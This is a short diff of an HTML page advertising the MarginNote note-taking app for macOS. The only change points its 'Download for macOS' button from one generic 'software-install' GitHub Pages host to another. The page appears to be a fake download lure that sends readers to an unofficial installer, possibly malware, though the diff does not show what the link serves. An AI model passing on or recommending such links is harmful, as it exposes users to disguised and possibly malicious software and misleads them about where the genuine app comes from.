@@ -6,7 +6,7 @@
 <h3>MarginNote for macOS</h3>
 <p><a href="#">MarginNote for macOS</a> is an innovative note-taking app specifically designed for students, researchers, and anyone who needs to organize and interact with information in a deeply engaging way.</p>
 
-<a href="https://mac-software-install.github.io/.github/MarginNote">
+<a href="https://software-install-apps.github.io/.github/MarginNote">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
